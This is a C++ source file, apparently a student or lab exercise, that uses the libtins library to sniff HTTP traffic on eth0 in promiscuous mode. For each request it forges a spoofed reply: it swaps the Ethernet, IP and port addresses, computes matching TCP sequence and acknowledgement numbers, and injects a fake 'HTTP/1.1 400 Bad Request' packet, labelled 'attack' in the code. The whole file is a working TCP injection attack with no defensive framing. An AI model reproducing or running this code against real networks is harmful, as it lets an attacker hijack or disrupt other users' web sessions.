#include <tins/tins.h>
#include <iostream>
#include <arpa/inet.h>
#include <algorithm>
using namespace Tins;
using namespace std;

struct pk_set
{
    EthernetII new_ethernet;
    IP new_ip;
    TCP new_tcp;
    uint32_t new_seq, new_ack;
    PacketSender sender;
    int count = 0;
    void sf_set()
    {
        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_filter("port 80");
        config.set_promisc_mode(true);
        config.set_timeout(0.0000001);
        Sniffer sniffer("eth0", config);
        sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
    }

    void debug(EthernetII ethernet, IP ip, TCP tcp)
    {
        cout<<"ethernet<src /dst> :"<<hex<<ethernet.src_addr()<<" / "<<ethernet.dst_addr()<<"\n";
        cout<<"IP src<src /dst> :"<<hex<<ip.src_addr()<<" / "<<ip.dst_addr()<<"\n";
        cout<<"IP Check sum : "<<ip.checksum()<<"\n";
        cout<<"Tcp port<src /dst> :"<<hex<<tcp.sport()<<" / "<<tcp.dport()<<"\n";
        cout<<"tcp.seq num : "<<hex<<tcp.seq()<<"\n";
        cout<<"tcp.ack num : "<<hex<<tcp.ack_seq()<<"\n";
        cout<<"tcp offset : "<<tcp.flags()<<"\n";
        //view macro
        cout<<"tcp ack : "<<tcp.ACK<<"\n";
        cout<<"tcp psh : "<<tcp.PSH<<"\n";
        cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";


    }

    void pk_swap(EthernetII ethernet, IP ip, TCP tcp)
    {

        //swap
        new_ethernet.src_addr(ethernet.dst_addr());
        new_ethernet.dst_addr(ethernet.src_addr());
        //swap
        new_ip.src_addr(ip.dst_addr());
        new_ip.dst_addr(ip.src_addr());
        new_ip.flags();
        //swap
        new_tcp.sport(tcp.dport());
        new_tcp.dport(tcp.sport());
        new_tcp.flags(0x18) ;


    }


    void tcp_caculator(TCP tcp,uint32_t s_payload_len , uint32_t a_payload_len)
    {
        new_seq = tcp.ack_seq() + s_payload_len; // caclulator
        new_ack = tcp.seq() + a_payload_len; //caclulator
        new_tcp.seq(new_seq);
        new_tcp.ack_seq(new_ack);
    }

    void chg_send()
    {

        fprintf(stderr, "bef sending 111\n");
        EthernetII attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 400 Bad Request\n");
        sender.send(attack, "eth0");
        fprintf(stderr, "Attack..");
        cout<<"send Debug"<<endl;
        debug(new_ethernet,new_ip,new_tcp);
        fprintf(stderr, "bef sending 222\n");
    }

    bool handle(PDU& pdu)
    {
        const EthernetII &ethernet = pdu.rfind_pdu<EthernetII>();
        const IP &ip = pdu.rfind_pdu<IP>();
        const TCP &tcp = pdu.rfind_pdu<TCP>();
        const RawPDU& raw = tcp.rfind_pdu<RawPDU>();

        if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50)
        {
            const RawPDU::payload_type& payload = raw.payload();
            pk_swap(ethernet,ip,tcp);
            tcp_caculator(tcp,0,payload.size());
            chg_send();
            //ack_send();
            cout<<"request packet "<<"\n";
            cout<<payload.data()<<"\n";
            debug(ethernet,ip,tcp);
            //return true;
        }


        return true;
    }


};

int main()
{
    pk_set ps;
    ps.sf_set();
}
